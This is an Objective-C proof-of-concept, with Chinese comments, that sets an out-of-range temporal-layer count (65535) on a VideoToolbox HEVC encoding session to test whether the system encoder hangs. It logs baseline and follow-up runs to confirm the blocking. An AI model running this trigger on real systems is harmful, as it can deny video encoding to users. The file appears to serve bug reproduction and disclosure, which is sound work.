#import <Foundation/Foundation.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdatomic.h>

static FILE *g;
static atomic_int g_encoded;
static void L(NSString *f, ...) { va_list a; va_start(a,f);
    NSString *s=[[NSString alloc] initWithFormat:f arguments:a];
    fprintf(g,"%s\n",s.UTF8String); fflush(g); va_end(a); }
static void onalarm(int s){ L(@"[TIMEOUT] 10 秒未返回 —— 阻塞确认"); fclose(g); _exit(42); }

static CVPixelBufferRef makeBuf(int w,int h){
    CVPixelBufferRef pb=NULL;
    NSDictionary *attr=@{(id)kCVPixelBufferIOSurfacePropertiesKey:@{}};
    if(CVPixelBufferCreate(kCFAllocatorDefault,w,h,kCVPixelFormatType_32BGRA,
        (__bridge CFDictionaryRef)attr,&pb)!=kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb,0);
    memset(CVPixelBufferGetBaseAddress(pb),0x40,CVPixelBufferGetBytesPerRow(pb)*h);
    CVPixelBufferUnlockBaseAddress(pb,0);
    return pb;
}

// 返回成功编码的帧数；nt=0 表示不设置该属性
static int encodeWith(int nt, int frames, const char *tag){
    atomic_store(&g_encoded,0);
    VTCompressionSessionRef s=NULL;
    OSStatus st=VTCompressionSessionCreate(kCFAllocatorDefault,64,64,
        kCMVideoCodecType_HEVC,NULL,NULL,NULL,NULL,NULL,&s);
    if(st!=noErr||!s){ L(@"  [%s] session 创建失败 %d",tag,(int)st); return -1; }
    if(nt>0){
        int32_t v=nt; CFNumberRef n=CFNumberCreate(NULL,kCFNumberSInt32Type,&v);
        st=VTSessionSetProperty(s,CFSTR("NumberOfTemporalLayers"),n);
        CFRelease(n);
        L(@"  [%s] 设置 NumberOfTemporalLayers=%d → 返回 %d",tag,nt,(int)st);
        if(st!=noErr){ VTCompressionSessionInvalidate(s); CFRelease(s); return -2; }
    }
    VTCompressionSessionPrepareToEncodeFrames(s);
    for(int i=0;i<frames;i++){
        CVPixelBufferRef pb=makeBuf(64,64);
        if(!pb) break;
        L(@"    [%s] EncodeFrame %d 开始",tag,i);
        st=VTCompressionSessionEncodeFrame(s,pb,CMTimeMake(i,30),kCMTimeInvalid,NULL,NULL,NULL);
        CVPixelBufferRelease(pb);
        L(@"    [%s] EncodeFrame %d → %d",tag,i,(int)st);
        if(st!=noErr) break;
    }
    VTCompressionSessionCompleteFrames(s,kCMTimeInvalid);
    int n=atomic_load(&g_encoded);
    VTCompressionSessionInvalidate(s); CFRelease(s);
    return n;
}

int main(void){ @autoreleasepool {
    char lp[512];
    // 每次运行用不同日志，便于对比"挂死前/后"
    int run=0; for(int i=0;i<50;i++){ snprintf(lp,sizeof(lp),"%s/ave_run%d.log",getenv("TMPDIR")?:"/tmp",i);
        if(access(lp,F_OK)!=0) break; run=i+1; }
    snprintf(lp,sizeof(lp),"%s/ave_run%d.log",getenv("TMPDIR")?:"/tmp",run);
    g=fopen(lp,"w"); if(!g) return 1;
    L(@"=== AVEDoS run%d pid=%d ===",run,getpid());
    signal(SIGALRM,onalarm);

    // 步骤一：基线（任何一次运行都先做）
    alarm(15);
    int base=encodeWith(1,3,"BASELINE");
    alarm(0);
    L(@"BASELINE 成功帧数 = %d",base);

    // 步骤二：只有第一次运行才触发挂死
    if(run==0){
        L(@"--- 触发：nt=65535 ---");
        alarm(6);
        int bad=encodeWith(65535,2,"HANG");
        alarm(0);
        L(@"HANG 路径返回 = %d（未阻塞）",bad);
        L(@"--- 再触发：nt=8 ---");
        int b8=encodeWith(8,2,"NT8");
        L(@"NT8 返回 = %d",b8);
    }
    L(@"=== run%d 结束 ===",run);
    fclose(g); }
    return 0; }
